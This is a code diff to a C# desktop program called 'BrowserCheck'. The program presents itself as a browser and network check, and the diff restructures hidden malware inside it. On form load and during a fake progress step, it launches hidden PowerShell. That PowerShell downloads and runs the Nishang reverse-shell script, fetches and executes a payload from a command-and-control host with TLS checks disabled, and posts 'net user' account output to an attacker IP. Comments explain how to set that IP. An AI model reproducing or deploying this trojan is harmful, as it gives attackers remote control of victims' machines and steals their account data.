@@ -56,20 +56,7 @@ namespace BrowserCheck
                 textBox1.Text = "Testing Network Connection";
                 if (progressBar1.Value == progressBar1.Step)
                 {
-                    ProcessStartInfo startInfo = new ProcessStartInfo();
-                    startInfo.FileName = "powershell.exe";
-                    startInfo.CreateNoWindow = true;
-                    startInfo.UseShellExecute = true;
-                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                    string ip_addr = "10.0.0.27";       //change this to the ip address that you control for the reverse shell, or the ip of the host for a bind shell
-                    int port_num = 443;                 //change this to the port number on the corresponding ip address
-                    string resource = "/index.php?id=";              //change this to the document you want to process the request. e.g. index.php
-
-                    //the [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };  disables ssl/tls verification
-                    startInfo.Arguments = "-Command \"$postParams = net user | ConvertTo-JSON ; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }; " +
-                        "Invoke-WebRequest -Uri https://" + ip_addr + ":" + port_num + resource + "  -ContentType application/json -Method POST -Body $postParams \"";
-
-                    Process.Start(startInfo);
+                    custom_c2_shell();
                 }
             }
             else if (progressBar1.Value >= 20 && progressBar1.Value < 40)
@@ -116,6 +103,15 @@ namespace BrowserCheck
         // When the program loads
         private void Form1_Load(object sender, EventArgs e)
         {
+
+            manual_reverse_shell();
+            
+        }
+
+        //manual reverse shell
+        //used when connecting to standard netcat listener
+        private void manual_reverse_shell()
+        {
             ProcessStartInfo startInfo = new ProcessStartInfo();
             startInfo.FileName = "powershell.exe";
             startInfo.CreateNoWindow = true;
@@ -126,11 +122,46 @@ namespace BrowserCheck
             int port_num = 443;                 //change this to the port number on the corresponding ip address
             startInfo.Arguments = "-Command \"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1') ; " +
                                              "Invoke-PowerShellTcp -" + shell_type + " -IPAddress " + ip_addr + " -Port " + port_num + "\"";
+
+
             Process.Start(startInfo);
-            
-            
         }
 
+        private void custom_c2_shell()
+        {
+            ProcessStartInfo startInfo = new ProcessStartInfo();
+            startInfo.FileName = "powershell.exe";
+            startInfo.CreateNoWindow = true;
+            startInfo.UseShellExecute = true;
+            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            string ip_addr = "10.0.0.27";       //change this to the ip address that you control for the reverse shell, or the ip of the host for a bind shell
+            int port_num = 443;                 //change this to the port number on the corresponding ip address
+            string resource = "/index.php?id=";              //change this to the document you want to process the request. e.g. index.php
+
+            //the [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };  disables ssl/tls verification
+            startInfo.Arguments = "-Command \"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }; " +
+                                  " iex(New-Object Net.WebClient).DownloadString('https://10.0.0.27:4444/deploy.php?platform=windows&variant=go' ) ; \"";
+            Process.Start(startInfo);
+        }
+
+        //function to post data to specific url
+        private void post_data()
+        {
+            ProcessStartInfo startInfo = new ProcessStartInfo();
+            startInfo.FileName = "powershell.exe";
+            startInfo.CreateNoWindow = true;
+            startInfo.UseShellExecute = true;
+            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            string ip_addr = "10.0.0.27";       //change this to the ip address that you control for the reverse shell, or the ip of the host for a bind shell
+            int port_num = 443;                 //change this to the port number on the corresponding ip address
+            string resource = "/index.php?id=";              //change this to the document you want to process the request. e.g. index.php
+
+            //the [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };  disables ssl/tls verification
+            startInfo.Arguments = "-Command \"$postParams = net user | ConvertTo-JSON ; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }; " +
+                "Invoke-WebRequest -Uri https://" + ip_addr + ":" + port_num + resource + "  -ContentType application/json -Method POST -Body $postParams \"";
+
+            Process.Start(startInfo);
+        }
         //Determines users default browser
         private string detect_browser(string browserName)
         {
